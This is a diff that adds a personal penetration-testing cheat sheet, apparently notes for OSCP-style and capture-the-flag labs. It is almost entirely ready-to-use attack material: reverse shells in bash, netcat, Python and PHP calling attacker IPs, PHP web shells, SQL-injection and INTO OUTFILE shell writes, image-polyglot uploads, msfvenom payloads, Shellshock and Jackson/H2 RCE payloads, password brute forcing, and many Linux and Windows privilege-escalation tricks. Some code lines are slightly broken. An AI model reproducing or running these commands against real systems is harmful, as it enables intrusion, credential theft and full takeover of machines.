@@ -1,0 +1,640 @@
+CHEATSHEET!!!
+
+bash -i >& /dev/tcp/IP/PORT 0>&1
+
+find / -perm -u=s -type f 2>/dev/null
+find / -type f -a ( -perm -u+s -o -perm -g+s ) -exec ls -l {} ; 2> /dev/null
+
+php reverse shell -
+<?php system($_GET['cmd']); ?>
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] 8082 >/tmp/f"); ?>
+
+Netcat reverse shell one liner
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
+nc [IP] 80 -e /bin/bash
+
+reverse shell: echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf
+
+python reverse shell one liner
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
+
+export PATH="/usr/bin:$PATH"
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+find / -perm -u=s -type f 2>/dev/null
+
+SQL Inject test-
+admin' or '1'='1
+' or 1=1--
+email '--
+
+Windows privesc-
+tasklist /v
+
+Hydra-
+hydra -l {name} -P /usr/share/wordlists/SecLists/Passwords/10K_most_common.txt _IP_ http-post-form "example.php:____:Invalid" -t 64
+
+graphql sample-
+url/graphql?query={user{username password}}
+
+Powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://[IP]:8000/JuicyPotato.exe','C:\Users\[LOCATION]\JuicyPotato.exe')"
+
+JuicyPotatox86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+
+PNG PHP Inject-
+cp original.png ./shell.php.png
+echo '<?php' >> ./shell.php.png 
+echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f");' >> ./shell.php.png 
+echo '?>' >> ./shell.php.png 
+
+netcat file transfer -
+nc [IP] 443 < /dir/file.txt
+sudo nc -lvnp 443 > file.txt
+
+Buffer Overflow
+msfvenom -p linux/x86/meterpreter/reverse_tcp -b "\x00" LHOST=10.9.38.228 LPORT=4444 -f python
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
+msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=1234 EXITFUNC=thread -f c -a x86 -b ""
+
+
+Mona Usefull 
+!mona modules
+!mona find -s "\xFF\xE4" -m essfunc.dll
+!mona jmp -r esp -m [App Name]
+!mona jmp -r esp -cpb "\x00"
+
+Transfer files with smbserver
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+copy \\[IP]\kali\[file] C:\[dir]\[file]
+
+
+Juicypotato
+echo C:\Users\{NAME}\\Desktop\nc.exe [My IP] {PORT} -e cmd.exe > rev.bat
+JuicyPotato.exe -l 6666 -p C:\Users\{Name}\\Desktop\rev.bat -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} <--CLSID
+
+
+ssh
+if Proc-Type: 4,ENCRYPTED
+/usr/share/john/ssh2john.py /.ssh/id_rsa > hash.txt
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+
+
+
+tmux
+tmux show -g | sed 's/^/set -g /' > ~/.tmux.conf
+---------------------------------------------------------------------------------------------------------------------------
+SMB / Samba 3.x Exploit without Metasploit.
+
+nmap -p445 --script smb-vuln-*
+
+
+#Victm
+
+smbclient //10.10.10.18
+smb >  logon "/=`nc 10..62.7 443 -e /bin/bash`"
+
+#KALI
+nc -nvlp 443
+---------------------------------------------------------------------------------------------------------------------------
+COMMANDS:
+
+Remove White Space:
+
+cat users | tr -d "[:blank:]" to
+---------------------------------------------------------------------------------------------------------------------------
+
+Find tools:
+
+which awk perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
+
+---------------------------------------------------------------------------------------------------------------------------
+Nmap -sV -sC -sS -Pn -p-
+---------------------------------------------------------------------------------------------------------------------------
+Reading Email With User name and password
+
+Telnet 10.10.X.X 110
+USER admin
+PASS password
+
+LIST
+
+RETR
+---------------------------------------------------------------------------------------------------------------------------
+
+nmap -p445 --script smb-protocols
+---------------------------------------------------------------------------------------------------------------------------
+DNSadmin
+
+DnsCmd /Config /ServerLevelPluginDll "C:\PathToDnsPlugin.dll"
+
+
+On Kali
+
+smbserver.py share .
+
+Without Downloading
+
+dnscmd /config /serverlevelplugindll \\10.10.14.6\share\rev.dll
+---------------------------------------------------------------------------------------------------------------------------
+POWERSHELL 
+
+powershell -c "Get-Service"
+
+IWR http:///10.10.X.X/rev.dll -outfile \\windows\\temp\\nc.exe; \\windows\\temp\\nc.exe 10.10.X.X 4444 -e powershell.exe
+
+powershell.exe -a '-NoProfile -Command IWR http://10.10.X.X/nc.exe -outfile \\windows\\temp\\nc.exe; \\windows\\temp\\nc.exe 10.10.X.X 4444 -e powershell.exe'
+
+powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.X.X/nc64.exe','C:\Windows\Temp\nc64.exe')
+
+---------------------------------------------------------------------------------------------------------------------------
+
+SSH
+
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@10.10.X.X
+
+---------------------------------------------------------------------------------------------------------------------------
+
+HYDRA
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.X.X http-post-form "/Account/login.aspx?ReturnURL=%2fadmin/:__VIEWSTATE=IkYHaVIXMlEbZTvDiUcuV9E2RasoFPyvFt7Ld7%2FXg%2FAl%2Fx3X7vWFy9H7fAfOxwn9o43Nzz01lfkr6ZDXLebRuJjxvJ58yzbG%2FaI34wS9kqnTA3B53sc5WrFYOiqXy4bOx2X1t4FSAz%2F3hqC5Zd0%2FN%2F3o8lV2R6IbHtuonVPs4g7N5FR2&__EVENTVALIDATION=1ONSwNEiCm5DjVvvYxHsTjrjY8IRY171Xsc5T41mneH3%2FONPcnTtrA8pYWSnrD6Gs1AUE0LfcYsmmFGfImzQkngc4urPZqTV3O%2B1nydaSh5aelWs%2BtNbbGxv4b2JuhdMduCR%2F98raRTDrJTYucbLGjwOP69C7zlscROp8fkBhP3MNMwW&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
+
+---------------------------------------------------------------------------------------------------------------------------
+
+Crackmapexec
+
+crackmapexec smb 10.10.10.169 -u user -p 'Welcome123!'
+
+---------------------------------------------------------------------------------------------------------------------------
+
+
+
+Evil-Winrm
+evil-winrm  -u melanie -p 'Welcome123!' -i 10.10.X.X
+
+---------------------------------------------------------------------------------------------------------------------------
+
+PsExec
+
+>PsExec64.exe -accepteula -d \\%COMPUTERNAME% -u WORKGROUP\Administrator -p admin "nc64.exe" -nd 172.16.201.195 7777 -e cmd.exe
+
+Runas
+
+runas /noprofile /user:WORKGROUP\Administrator "nc64.exe -nd 172.16.X.X 7777 -e cmd.exe"
+
+---------------------------------------------------------------------------------------------------------------------------
+
+Windapserach
+
+windapsearch --dc resolute.htb -m users
+windapsearch --dc resolute.htb -m users --full
+windapsearch --dc resolute.htb -m users --attrs description
+windapsearch --dc resolute.htb -m users --attrs sAMAccountName | grep sAMAccountName | cut -d " " -f2 | tee users.txt
+
+---------------------------------------------------------------------------------------------------------------------------
+
+WP_SCAN - Brute Force
+
+wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
+wpscan --url http://internal.thm/blog -e ap,at,etc --max-threads 50
+
+
+---------------------------------------------------------------------------------------------------------------------------
+
+WORDPRESS REV SHELL
+
+/wordpress/wp-content/themes/twentyfifteen/404.php
+
+---------------------------------------------------------------------------------------------------------------------------
+
+MOUNT 
+
+showmount -e IPADDR
+
+mount 192.168.1.1:/vol/share /mnt/nfs  -nolock
+
+mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs
+
+---------------------------------------------------------------------------------------------------------------------------
+
+DOWNLOAD  / FTP 
+
+certutil.exe -urlcache -f http://192.168.19.21/CVE_2019-0841.exe  CVE_2019-0841.exe 
+powershell IEX(New-Object Net.WebClient).DownloadFile('http://172.16.X.X:8888/nc64.exe','nc64.exe')
+
+powershell -c '(new-object System.Net.WebClient).DownloadFile("http://IP/nc.exe", "C:\Windows\Temp\nc.exe")'
+# OR
+powershell -c 'Invoke-WebRequest "http://IP/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"' 
+
+
+psexec.py 'administrator:PASSWORD123'@10.10.X.X
+
+python -m pyftpdlib -p 21 --write [[[[ Starting FTP ]]]]
+---------------------------------------------------------------------------------------------------------------------------
+
+
+GOBUSTER
+
+gobuster dir -u http://192.168.X.X -w /usr/share/wordlists/dirb/common.txt
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.X.X -k -x php,txt,conf
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.X.X -x php,php.bak,html,txt,bak,ol -s 200
+
+SubDomain Gobuster
+
+gobuster vhsot -u anon.htb.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | gre "Status: 200"
+
+
+---------------------------------------------------------------------------------------------------------------------------
+
+WFUZZ -- SUBDOMAIN HUNTING 
+
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.votenow.local" --hc 400 --hw 854 -t 100 192.168.222.135
+
+
+--hc 400 == hidding 400 status code
+--hw 854 == hidding world length 854
+---------------------------------------------------------------------------------------------------------------------------
+
+
+SQL Reverse Shell:
+
+select '<?php system("rm -f /tmp/p; mknod /tmp/p p && nc 192.168.X.X 1337 0/tmp/p");exit?>'
+
+Select '<?php system("nc -nv 10.9.62.7 1337 -e /bin/bash");exit; ?>'
+
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
+---------------------------------------------------------------------------------------------------------------------------
+
+Remote SSH Local Tunnel
+
+From our machine:
+ ssh -L 10000:localhost:10000 <username>@<ip>
+
+Or
+
+ssh -L 80:intra.example.com:80 gw.example.com
+[9:47 PM]
+ssh -L 127.0.0.1:80:intra.example.com:80 gw.example.com
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------
+
+HYDRA
+
+# hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.X.X -t 4 ssh
+
+# hydra -l root -P Documents/pass.txt 192.168.X.X -t 4 ssh
+
+# hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt -M Documents/ip.txt -t 4 ssh
+
+---------------------------------------------------------------------------------------------------------------------------
+
+DNSadmin
+
+dnscmd /config /serverlevelplugindll \\10.10.14.18\share\rev.dll
+
+---------------------------------------------------------------------------------------------------------------------------
+SMB SHARE
+
+smbserver.py <sharename> ./
+
+
+---------------------------------------------------------------------------------------------------------------------------
+#RECIEVING SIDE
+
+nc -lp 80 > linux-exploit-suggester.sh
+
+#SENDING SIDE
+
+nc -nv  10.9.X.X 80 < linux-exploit-suggester.sh
+
+---------------------------------------------------------------------------------------------------------------------------
+# VICTIM
+
+FIND MAGICS
+
+find | tee /root/Desktop/Box1     ----- Dump Complete Structure of current folder.
+
+
+find / -maxdepth 5 -name *.php -type f -exec grep -Hn password {} \; 2>/dev/null
+
+find / -maxdepth 4 -name *.php -type f 2>/dev/null | xargs grep -C 3 -i pass
+
+
+find / -perm -u=s -type f 2>/dev/null
+ 
+find / -type f -perm -04000 -ls 2>/dev/null
+
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+/usr/bin/supervisord 2>&1 | grep -i -E "open|access|no such file"
+
+---------------------------------------------------------------------------------------------------------------------------
+
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+
+#KALI
+
+chmod 400 id_rsa
+ssh -i id_rsa root@<ip>
+
+---------------------------------------------------------------------------------------------------------------------------
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+---------------------------------------------------------------------------------------------------------------------------
+
+john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
+
+---------------------------------------------------------------------------------------------------------------------------
+
+[ New User with username new and password 123 ]
+
+openssl passwd -1 -salt [salt] [password]
+
+new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash   
+---------------------------------------------------------------------------------------------------------------------------
+
+Rev Shell
+mkfifo /tmp/xebrfct; nc 10.9.62.7 8888 0</tmp/xebrfct | /bin/sh >/tmp/xebrfct 2>&1; rm /tmp/xebrfct    ---- nc -nvlp 8888
+
+PHP Rev Shell
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+
+codeexec.php <?php system($_GET['cmd']); ?>
+
+---------------------------------------------------------------------------------------------------------------------------
+cmdkey /list - Runas - Saved Creds
+
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\secuirty\root.txt
+
+
+---------------------------------------------------------------------------------------------------------------------------
+icacls
+
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+---------------------------------------------------------------------------------------------------------------------------
+Always Install Elevated
+
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+ --> AlwaysInstallElevated REG_DWORD 0x1
+
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+  --> AlwaysInstallElevated REG_DWORD 0x1
+---------------------------------------------------------------------------------------------------------------------------
+PNG PHP Command Execution 
+
+vim rev.png
+
+GIF89;
+<?php echo shell_exec($_GET["cmd"]); ?>
+
+---------------------------------------------------------------------------------------------------------------------------
+vim rev.php
+
+<?php
+system('nc.exe -e cmd.exe 10.10.14.43 4444')
+?>
+---------------------------------------------------------------------------------------------------------------------------
+Firefox Store Password Exploit
+
+AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+
+key4.db
+cert9.db
+logins.json
+
+---------------------------------------------------------------------------------------------------------------------------
+
+Mysql Root Escape
+
+ps aux | grep mysql
+
+mysql -u root
+
+use mysql;
+
+select * from mysql.func;
+
+select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh');
+
+---------------------------------------------------------------------------------------------------------------------------
+
+PHP MY Admin
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php"
+
+
+---------------------------------------------------------------------------------------------------------------------------
+
+Shell Escape
+
+sudo find . -exec /bin/sh \; -quit
+sudo find /bin -name nano -exec /bin/sh \;
+sudo awk 'BEGIN {system("/bin/sh")}'
+echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+sudo vim -c '!sh'
+sudo vi  ---- :!sh
+sudo vi -c ':!/bin/sh' /dev/null
+sudo nmap --interactive  ---- :!sh
+
+---------------------------------------------------------------------------------------------------------------------------
+
+getcap -r / 2>/dev/null   [[[  abilities ]]]
+
+/usr/bin/python2.6 = cap_setuid+ep 
+/usr/bin/python2.6 -c 'import os; os.setuid(o); os.system("/bin/bash")'
+
+---------------------------------------------------------------------------------------------------------------------------
+
+SUID /usr/local/bin/suid-env		  [[[[ strings /usr/local/bin/suid-env ]]]]]  {{{{ service start apache2 }}}}
+
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+gcc /tmp/service.c -o /tmp/service
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
+
+---------------------------------------------------------------------------------------------------------------------------
+
+SUID /usr/local/bin/suid-env2                [[[[ strings /usr/local/bin/suid-env2 ]]]]]  {{{{ /usr/sbin/service start apache2 }}}}
+
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+
+---------------------------------------------------------------------------------------------------------------------------
+
+SUID /usr/local/bin/suid-so
+
+strace /usr/local/bin/suid-so 2>&1 | grep -iE “open|access|no such file”
+<-- See if a file is being called that is writeable or in a writable directory --> { anon.c }
+
+vim anon.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+void inject() {
+system(“cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p”); }
+
+<---> compile:<--->
+gcc -shared -fPIC -o /home/user/.config/anon.so anon.c 
+
+---------------------------------------------------------------------------------------------------------------------------
+
+LD_PRELOAD ENVIRONMENT VARIABLE
+
+vi x.c
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+sudo LD_PRELOAD=/tmp/x.so apache2
+
+---------------------------------------------------------------------------------------------------------------------------
+
+LD LIBRARY PATH
+
+ldd /usr/sbin/apache2
+
+Output will contain many ".so" file.
+
+Example,
+Libcrypt.so.1 is found.
+
+vim ldd.c
+
+#include <studio.h>
+#include <stdlib.h>
+
+static void hijack()__attribute__(constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+
+
+gcc -o Libcrypt.so.1 -shared -fPIC ldd.c
+
+
+sudo LD_LIBRARY_PATH=. apache2
+
+
+---------------------------------------------------------------------------------------------------------------------------
+Multi Handler :
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+
+---------------------------------------------------------------------------------------------------------------------------
+Shell Shock Exploit
+
+curl -v --proxy ip:3128 http://ip/cgi-bin/status -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit"
+
+curl -v --proxy ip:3128 http://ip/cgi-bin/status -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /bin/bash -i >& /dev/tcp/IP/4444 0>&1"
+
+---------------------------------------------------------------------------------------------------------------------------
+
+
+Port forward using plink
+
+plink.exe -l root -pw 45131354 -L 445:127.0.0.1:445 10.10.14.43
+
+#KALI
+
+winexe -U Admin%Password //127.0.0.1 "cmd.exe'
+
+Make sure root login is enabled /etc/ssh/sshd_config
+
+
+Port Forwarding Using Chisel
+Chisel
+On Host: sudo ./chisel.sh server --reverse --port <LPORT>
+On Target: chisel client <LHOST>:<LPORT> R:<PORT_TO_FWD>:127.0.0.1:<PORT_T
+
+From <https://github.com/seal9055/oscp-notes#Web-Exploitation> 
+
+
+
+---------------------------------------------------------------------------------------------------------------------------
+Crazy Magic
+
+icacls filename
+				[[[[ shows permissions ]]]]
+dir /q
+				[[[[ shows 	Displays file ownership information. ]]]]]
+icacls filename /grant username:F
+				[[[[ grant Full permision to user ]]]]
+---------------------------------------------------------------------------------------------------------------------------
+Web Enumeration
+
+nikto -h IP_ADDR
+gobuster -e -u http://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -s 200,204,301,302
+dirsearch -u https://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,sh -x 404 -t 100
+wfuzz -w wordlist.txt --filter "c=200 and l>0" http://IP_ADDR/somepath.php?url=FUZZ
+gobuster dir -u http://$IP/folder -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
+gobuster dir -u http://$IP/folder -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 40
+gobuster dir -u http://$IP/folder -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,cgi,js,css,py -t 40
+
+---------------------------------------------------------------------------------------------------------------------------
+
+Snmpwalk
+
+snmpwalk -c public -v 1 10.10.10.116 > snmp-public.txt
+
+
+Nmap Scripts
+
+nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 10.11.1.8
+
+nmap -sV --script=nfs-* 192.168.44.133
+nmap -sV --script=nfs-ls 192.168.44.133  //same result as rpcinfo
+nmap -sV --script=nfs-* 192.168.44.133 // all nfs scripts
+nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER 10.10.10.17
+-------------------------------------------------------------------
+Rev.sql - Jackson RCE And SSRF - Time HTB                                                               
+                          
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://[IP]/Rev.sql'"}]
+                          
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+   String[] command = {"bash", "-c", cmd};                                                              
+   java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+   return s.hasNext() ? s.next() : "";  }
+$$;                                                                                                     
+CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"')
+-------------------------------------------------------------------
+#Privilege Escalation Advanced
+
+sudo latest vuln --> sudo -u#-1
+
+shared object injection | symlinks --> find /-type f -perm 04000 -ls 2>/dev/null
+
+function /usr/sbin/service() { cp /bin/bash /tmp/ && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f usr/sbin/service "-f --> refers to shell function"
+
+#Hunting Capabilities
+getcap -r / 2>/dev/null
+
+-----------------------------
+cat nmap/initial | grep tcp | awk '{print $1}' |  cut -d '/' -f 1 | tr '\n' ','
+
+os.popen('cat /etc/services').read()
